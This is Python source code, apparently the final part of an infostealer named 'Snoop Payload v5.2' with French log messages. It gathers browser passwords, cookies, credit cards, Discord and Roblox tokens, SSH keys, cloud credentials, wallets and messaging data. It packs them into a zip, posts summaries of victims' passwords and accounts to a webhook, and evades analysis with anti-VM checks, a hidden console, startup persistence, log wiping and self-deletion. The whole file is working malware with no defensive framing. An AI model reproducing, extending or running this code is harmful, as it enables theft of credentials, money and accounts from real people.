    (MODULE_FLAG_FTP_CLIENTS,       "FTP Clients",       collect_ftp,               "09_Remote",       "remote"),
    (MODULE_FLAG_SSH_KEYS,          "SSH Keys",          collect_ssh,               "09_Remote",       "remote"),
    (MODULE_FLAG_CLOUD_CREDENTIALS, "Cloud Credentials", collect_cloud,             "09_Remote",       "remote"),
    (MODULE_FLAG_TELEGRAM,          "Telegram",          collect_telegram,          "10_Comms",        "communication"),
    (MODULE_FLAG_SIGNAL,            "Signal",            collect_signal,            "10_Comms",        "communication"),
    (MODULE_FLAG_HISTORY,           "History",           collect_history,           "11_History",      "history"),
    (MODULE_FLAG_DOWNLOADS,         "Downloads",         collect_downloads,         "11_History",      "history"),
    (MODULE_FLAG_FILES,             "Files",             collect_files,             "12_Files",        "files"),
]

# Extensions
ROBLOX_EXT = (MODULE_FLAG_ROBLOX_COOKIES, "Roblox Account", collect_roblox_accounts,
              "04_Roblox", "roblox")
LOCAL_STATE_EXT = (MODULE_FLAG_COOKIES, "Local State", collect_local_state,
                   "02_Credentials", "credentials")


# ============================================================
# HELPERS
# ============================================================
def _fmt_size(b):
    for unit in ("B", "KB", "MB", "GB"):
        if b < 1024:
            return f"{b:.1f} {unit}"
        b /= 1024
    return f"{b:.1f} TB"


def _short(text, limit=250):
    text = str(text).strip()
    return text if len(text) <= limit else text[:limit - 1] + "…"


def _sysinfo_lookup(key, default="N/A"):
    path = os.path.join(TEMP_DIR, "system_info.txt")
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            for ln in f:
                if ln.startswith(key + ":"):
                    return ln.split(":", 1)[1].strip()
    except Exception:
        pass
    return default


def _read_file(path, max_bytes=200_000):
    if not os.path.exists(path):
        return ""
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return f.read(max_bytes)
    except Exception:
        return ""


def _count_lines(path, prefix=None, tabbed=False):
    content = _read_file(path, max_bytes=10_000_000)
    if not content:
        return 0
    if tabbed:
        return sum(1 for ln in content.splitlines() if "\t" in ln)
    if prefix:
        return sum(1 for ln in content.splitlines() if ln.startswith(prefix))
    return sum(1 for ln in content.splitlines() if ln.strip())


# ============================================================
# ZIP
# ============================================================
def build_single_zip(results_map):
    PRIORITY = [
        "System Info", "Product Key", "Passwords", "Cookies",
        "Credit Cards", "Autofill", "Firefox", "Local State",
        "Discord Tokens", "Discord Metadata",
        "Roblox Cookies", "Roblox Account", "Extensions",
        "WiFi Passwords", "VPN", "FTP Clients", "SSH Keys",
        "Cloud Credentials", "Telegram", "Signal",
        "Environment", "Wallets", "Browser Wallets",
        "History", "Downloads", "Apps", "Steam Extended",
        "Game Launchers", "Screenshot", "Webcam", "Files",
    ]

    mega_path = os.path.join(TEMP_DIR, f"snoop_{SESSION_ID}.zip")
    manifest = [
        "=" * 60,
        f"  SNOOP REPORT — {SESSION_ID}",
        "=" * 60,
        f"  User    : {CURRENT_USER}",
        f"  Machine : {socket.gethostname()}",
        f"  Date    : {datetime.datetime.now():%Y-%m-%d %H:%M:%S}",
        "=" * 60, "", "Contenu :", "",
    ]

    sorted_items = sorted(
        results_map.items(),
        key=lambda x: PRIORITY.index(x[0]) if x[0] in PRIORITY else 999,
    )

    skipped = []
    running_size = 0
    CAP = MAX_ZIP * 0.95

    with zipfile.ZipFile(mega_path, "w", zipfile.ZIP_DEFLATED,
                         compresslevel=9, strict_timestamps=False) as z:
        for label, (path, folder, category) in sorted_items:
            if not path or not os.path.exists(path):
                manifest.append(f"  [—] {label}")
                continue

            if os.path.isdir(path):
                added, added_sz = 0, 0
                for root_, _, files_ in os.walk(path):
                    for fn in files_:
                        full = os.path.join(root_, fn)
                        try:
                            fsz = os.path.getsize(full)
                        except Exception:
                            continue
                        if running_size + added_sz + fsz > CAP:
                            continue
                        rel = os.path.relpath(full, path)
                        arc = f"{folder}/{label}/{rel}".replace("\\", "/")
                        try:
                            z.write(full, arc)
                            added += 1
                            added_sz += fsz
                        except Exception:
                            pass
                running_size += added_sz
                if added:
                    manifest.append(f"  [+] {folder}/{label}/  ({added} fichiers, {_fmt_size(added_sz)})")
                else:
                    manifest.append(f"  [—] {label} (skip taille)")
            else:
                try:
                    sz = os.path.getsize(path)
                except Exception:
                    manifest.append(f"  [✗] {label}")
                    continue
                if running_size + sz > CAP:
                    skipped.append(label)
                    manifest.append(f"  [!] {label} — skip (limite)")
                    continue
                arc = f"{folder}/{os.path.basename(path)}".replace("\\", "/")
                try:
                    z.write(path, arc)
                    running_size += sz
                    manifest.append(f"  [+] {arc}  ({_fmt_size(sz)})")
                except Exception:
                    manifest.append(f"  [✗] {label}")

        if os.path.exists(ERROR_LOG) and os.path.getsize(ERROR_LOG) > 0:
            try:
                err_sz = os.path.getsize(ERROR_LOG)
                if running_size + err_sz <= CAP:
                    z.write(ERROR_LOG, "99_Errors/snoop_errors.log")
                    running_size += err_sz
                    manifest.append("  [+] 99_Errors/snoop_errors.log (chiffré)")
            except Exception:
                pass

        if skipped:
            manifest.append("")
            manifest.append("Modules skippés (limite 6.5 Mo) :")
            for s in skipped:
                manifest.append(f"  - {s}")

        z.writestr("MANIFEST.txt", "\n".join(manifest))

    final_size = os.path.getsize(mega_path)
    log(f"Zip final : {_fmt_size(final_size)} (interne : {_fmt_size(running_size)})")
    return mega_path, final_size


# ============================================================
# EMBEDS
# ============================================================
def build_embeds(results, counts, zip_size):
    embeds = []

    embeds.append({
        "title": "🕵️  SNOOP REPORT",
        "description": (
            f"```yaml\n"
            f"Session : {SESSION_ID}\n"
            f"User    : {CURRENT_USER}\n"
            f"Machine : {socket.gethostname()}\n"
            f"Date    : {datetime.datetime.now():%Y-%m-%d %H:%M}\n"
            f"IP      : {_sysinfo_lookup('External IP')}\n"
            f"```"
        ),
        "color": 0x9D4EDD,
        "footer": {"text": f"Snoop v5.2 · zip {_fmt_size(zip_size)}"},
        "timestamp": datetime.datetime.utcnow().isoformat(),
    })

    embeds.append({
        "title": "💻  Système",
        "color": 0x5A189A,
        "fields": [
            {"name": "🖥️ OS",     "value": f"`{_short(_sysinfo_lookup('OS'), 80)}`", "inline": False},
            {"name": "⚙️ CPU",    "value": f"`{_short(_sysinfo_lookup('CPU'), 80)}`", "inline": False},
            {"name": "🎮 GPU",    "value": f"`{_short(_sysinfo_lookup('GPU'), 80)}`", "inline": False},
            {"name": "💾 RAM",    "value": f"`{_sysinfo_lookup('RAM')}`", "inline": True},
            {"name": "🔐 Admin",  "value": f"`{_sysinfo_lookup('Admin')}`", "inline": True},
            {"name": "⏱️ Uptime", "value": f"`{_sysinfo_lookup('Uptime')}`", "inline": True},
            {"name": "🌐 Locale", "value": f"`{_sysinfo_lookup('Local IP')}`", "inline": True},
            {"name": "🌍 Publique","value": f"`{_sysinfo_lookup('External IP')}`", "inline": True},
            {"name": "📡 MAC",    "value": f"`{_sysinfo_lookup('MAC')}`", "inline": True},
        ],
    })

    pwd_txt = _read_file(os.path.join(TEMP_DIR, "passwords.txt"))
    top_pass = []
    for block in pwd_txt.split("\n\n"):
        if "User:" in block and "Pass:" in block:
            lines = [ln for ln in block.splitlines() if ln.startswith(("URL:", "User:", "Pass:"))]
            if lines:
                top_pass.append(" | ".join(_short(l, 40) for l in lines))
        if len(top_pass) >= 3:
            break

    cred_desc = (
        f"**🔑 Mots de passe** : `{counts.get('passwords', 0)}`\n"
        f"**🍪 Cookies** : `{counts.get('cookies', 0)}`\n"
        f"**💳 Cartes** : `{counts.get('cards', 0)}`\n"
        f"**📝 Autofill** : `{counts.get('autofill', 0)}`\n"
        f"**🦊 Firefox** : `{'oui' if counts.get('firefox') else 'non'}`\n"
        f"**🧩 Extensions** : `{counts.get('extensions', 0)}`\n"
    )
    if top_pass:
        cred_desc += "\n**Derniers :**\n```\n" + "\n".join(top_pass) + "\n```"

    embeds.append({
        "title": "🔐  Credentials",
        "description": cred_desc[:4000],
        "color": 0x9D4EDD,
    })

    discord_meta = _read_file(os.path.join(TEMP_DIR, "discord_metadata.txt"))
    blocks = discord_meta.split("Token: ")
    accounts = []
    for b in blocks[1:]:
        acc = {}
        for ln in b.splitlines():
            ln = ln.strip()
            if ":" in ln:
                k, v = ln.split(":", 1)
                acc[k.strip()] = v.strip()
        accounts.append(acc)

    d_fields = [{"name": "🔑 Tokens trouvés", "value": f"`{counts.get('discord_tokens', 0)}`", "inline": True}]
    for i, acc in enumerate(accounts[:3], 1):
        parts = []
        for k in ("ID", "Username", "Global name", "Email", "Phone", "Nitro", "MFA"):
            if k in acc and acc[k] and acc[k] != "None":
                parts.append(f"`{k}` = `{_short(acc[k], 50)}`")
        if parts:
            d_fields.append({
                "name": f"👤 Compte #{i}",
                "value": "\n".join(parts)[:1020],
                "inline": False,
            })
    if d_fields:
        embeds.append({
            "title": "💬  Discord",
            "color": 0x5865F2,
            "fields": d_fields[:8],
        })

    rb_txt = _read_file(os.path.join(TEMP_DIR, "roblox_accounts.txt"))
    rb_lines = [ln.strip() for ln in rb_txt.splitlines()
                if ln.strip().startswith(("User:", "ID:", "Robux:", "Friends:", "Premium:", "Created:"))]
    if rb_lines or counts.get("roblox", 0):
        embeds.append({
            "title": "🎮  Roblox",
            "color": 0xE2231A,
            "description": (
                f"**Cookies** : `{counts.get('roblox', 0)}`\n"
                f"```\n" + "\n".join(rb_lines[:20]) + "\n```"
            )[:4000],
        })

    ok = sum(1 for _, s, _ in results if s == "🟢")
    total = len(results)
    module_fields = [
        {"name": f"{status} {label}",
         "value": f"`{_fmt_size(size)}`",
         "inline": True}
        for label, status, size in results
    ]
    embeds.append({
        "title": f"📦  Modules ({ok}/{total})",
        "color": 0x7B2CBF,
        "fields": module_fields[:24],
    })

    return embeds[:10]


# ============================================================
# BUILD & SEND
# ============================================================
def build_and_send():
    log("=" * 60)
    log(f"Snoop Payload v5.2 — {datetime.datetime.now():%Y-%m-%d %H:%M:%S}")
    log("=" * 60)

    all_mods = list(MODULES)
    if MODULE_FLAG_ROBLOX_COOKIES:
        all_mods.append(ROBLOX_EXT)
    if MODULE_FLAG_COOKIES:
        all_mods.append(LOCAL_STATE_EXT)

    enabled = [m for m in all_mods if m[0]]
    log(f"Modules actifs : {len(enabled)}")

    results = []
    results_map = {}
    counts = {}

    for idx, (flag, label, fn, folder, category) in enumerate(enabled, 1):
        log(f"[{idx}/{len(enabled)}] {label}...")
        t0 = time.time()
        try:
            res = fn(TEMP_DIR)
        except Exception as e:
            log(f"    ✗ {e}", "ERROR")
            _log("Main", f"{label}: {e}")
            res = None
        dt = time.time() - t0

        if not res:
            log(f"    — rien ({dt:.1f}s)")
            results.append((label, "⚪", 0))
            continue

        size = _safe_size(res)
        log(f"    ✓ {_fmt_size(size)} ({dt:.1f}s)")
        results.append((label, "🟢", size))
        results_map[label] = (res, folder, category)

        lkey = label.lower()
        if "password" in lkey:
            counts["passwords"] = _count_lines(res, "URL:")
        elif "cookie" in lkey and "roblox" not in lkey:
            counts["cookies"] = _count_lines(res, tabbed=True)
        elif "credit" in lkey:
            counts["cards"] = _count_lines(res, "Card:")
        elif "autofill" in lkey:
            counts["autofill"] = _count_lines(res)
        elif "extension" in lkey:
            counts["extensions"] = _count_lines(res, "[")
        elif "discord token" in lkey:
            counts["discord_tokens"] = _count_lines(res)
        elif "roblox cookie" in lkey:
            counts["roblox"] = _count_lines(res, tabbed=True)
        elif "firefox" in lkey:
            counts["firefox"] = 1

    pk_path = os.path.join(TEMP_DIR, "product_key.txt")
    if os.path.exists(pk_path):
        try:
            with open(pk_path, "r", encoding="utf-8") as f:
                pk = f.read().replace("Product Key: ", "").strip()
            sysinfo_path = os.path.join(TEMP_DIR, "system_info.txt")
            if os.path.exists(sysinfo_path):
                with open(sysinfo_path, "a", encoding="utf-8") as f:
                    f.write(f"Product Key: {pk}\n")
        except Exception:
            pass

    log("Construction du zip...")
    mega_zip, mega_size = None, 0
    try:
        mega_zip, mega_size = build_single_zip(results_map)
        log(f"Zip : {_fmt_size(mega_size)}")
    except Exception as e:
        log(f"✗ zip : {e}", "ERROR")
        _log("Zip", str(e))

    log("Génération des embeds...")
    embeds = build_embeds(results, counts, mega_size)

    log(f"Envoi des embeds ({len(embeds)})...")
    send_to_webhook(embeds=embeds)

    if mega_zip and os.path.exists(mega_zip):
        if mega_size <= 8 * 1024 * 1024:
            log(f"Envoi du zip ({_fmt_size(mega_size)})...")
            send_to_webhook(files={f"snoop_{SESSION_ID}.zip": mega_zip})
        else:
            log(f"[!] Zip {_fmt_size(mega_size)} dépasse 8 Mo — fallback", "WARN")
            fallback = {}
            for name in ("passwords.txt", "discord_tokens.txt", "discord_metadata.txt",
                         "roblox_cookies.txt", "roblox_accounts.txt", "wifi.txt",
                         "product_key.txt", "system_info.txt"):
                p = os.path.join(TEMP_DIR, name)
                if os.path.exists(p) and os.path.getsize(p) < 7 * 1024 * 1024:
                    fallback[name] = p
            if fallback:
                send_to_webhook(files=fallback)


def main():
    if SECURITY_ANTI_VM_DEBUG:
        log("Anti-VM...")
        if anti_vm_debug():
            log("VM détectée — exit", "WARN")
            sys.exit(0)
        log("Anti-VM OK")

    if SECURITY_ANTI_TAMPER:
        hide_console()

    try:
        build_and_send()
    except Exception as e:
        import traceback
        log(f"Fatal : {e}", "ERROR")
        traceback.print_exc()
        _log("Main", str(e))

    log("Nettoyage...")
    shutil.rmtree(TEMP_DIR, ignore_errors=True)

    if SECURITY_STARTUP_PERSISTENCE:
        persist_startup()

    if SECURITY_WIPE_LOGS:
        wipe_logs()

    if SECURITY_SELF_DELETE:
        self_delete()

    log("Terminé.")
    sys.exit(0)


if __name__ == "__main__":
    main()
